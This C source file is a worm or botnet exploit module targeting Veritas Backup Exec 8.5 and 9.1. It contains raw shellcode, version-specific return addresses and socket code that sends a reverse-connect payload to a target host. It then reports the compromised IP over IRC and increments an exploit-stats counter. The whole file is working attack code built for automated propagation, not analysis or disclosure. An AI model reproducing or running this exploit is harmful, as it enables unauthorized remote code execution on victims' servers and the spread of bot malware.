/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
*/     


#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

char v91sp0sp1[]="\xFF\x50\x11\x40";
char esisp0sp1[]="\xA1\xFF\x42\x01";
char v85[]="\xFF\x38\x11\x40";
char esiold[]="\xB9\x08\x43\x01";

char talk[] =
"\x02\x00\x32\x00"
"\x90\x90\x90\x90"
"\x31\xF6\xC1\xEC\x0C\xC1\xE4\x0C\x89\xE7\x89\xFB\x6A\x01\x8B\x74"
"\x24\xFE\x31\xD2\x52\x42\xC1\xE2\x10\x52\x57\x56\xB8\x00\x00\x00"
"\x00\xC1\xE8\x08\xFF\x10\x85\xC0\x79\x07\x89\xDC\x4E\x85\xF6\x75"
"\xE1\xFF\xE7\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x00"
"1.1.1.1.1.1"
"\x00"
"\xEB\x80";

typedef enum
{
	Backup_Exec_v9_1_4691_SP1_SP0,
	Backup_Exec_v8_5_3572,
} VertiasBackupExec_Version;

BOOL VertiasBackupExec( EXINFO exinfo, VertiasBackupExec_Version eVersion )
{
	char *pszVerString;
	// ---
	int nShellSize;
	char szShellBuf[ 512 ];
	// ---
	SOCKET nFDSocket;
	sockaddr_in ServerAddr;
	// ---
	int nCounter;

	// prepare version depending data
	if( eVersion == Backup_Exec_v9_1_4691_SP1_SP0 )
	{
		memcpy( &talk[ 37 ], &v91sp0sp1, 4 );
		memcpy( &talk[ 72 ], &esisp0sp1, 4 );
		pszVerString = "v9.1.4691.0+1";
	}
	else if( eVersion == Backup_Exec_v8_5_3572 )
	{
		memcpy( &talk[ 37 ], &v85, 4 );
		memcpy( &talk[ 72 ], &esiold, 4 );
		pszVerString = "v8.5.3572";
	}
	else
		return FALSE;

	// get shellcode
	nShellSize = GetRNS0TerminatedShellcode( szShellBuf, sizeof( szShellBuf ), GetIP( exinfo.sock ), filename );
	if( !nShellSize )
		return FALSE;

	// create socket
	nFDSocket = fsocket( AF_INET, SOCK_STREAM, IPPROTO_IP );
	if( nFDSocket == INVALID_SOCKET )
		return FALSE;

	// connect to it
	memset( &ServerAddr, 0, sizeof( ServerAddr ) );
	ServerAddr.sin_family		= AF_INET;
	ServerAddr.sin_port			= fhtons( exinfo.port );
	ServerAddr.sin_addr.s_addr	= finet_addr( exinfo.ip );
	if( fconnect( nFDSocket, (sockaddr*)&ServerAddr, sizeof( ServerAddr ) ) == SOCKET_ERROR )
	{
		fclosesocket( nFDSocket );
		return FALSE;
	}

	// send talk
	if( fsend( nFDSocket, talk, sizeof( talk ) - 1, 0 ) == SOCKET_ERROR )
	{
		fclosesocket( nFDSocket );
		return FALSE;
	}
	Sleep( 10 );

	// send payload(s)
	for( nCounter = 0; nCounter < 7; nCounter++ )
	{
		if( fsend( nFDSocket, szShellBuf, strlen( szShellBuf ), 0 ) == SOCKET_ERROR )
		{
			fclosesocket( nFDSocket );
			return FALSE;
		}
		
		Sleep( 10 );
	}
	Sleep( 1000 );

	fclosesocket( nFDSocket );

	// MESSAGE(S)
	char buffer[ IRCLINE ];
	_snprintf(buffer, sizeof(buffer), "[%s (%s)]: Exploiting IP: %s.", exploit[exinfo.exploit].name, pszVerString, exinfo.ip);
	if (!exinfo.silent)
		irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;

	return TRUE;
}

BOOL VertiasBackupExec( EXINFO exinfo )
{
	VertiasBackupExec( exinfo, Backup_Exec_v9_1_4691_SP1_SP0 );
	VertiasBackupExec( exinfo, Backup_Exec_v8_5_3572 );

	return TRUE;
}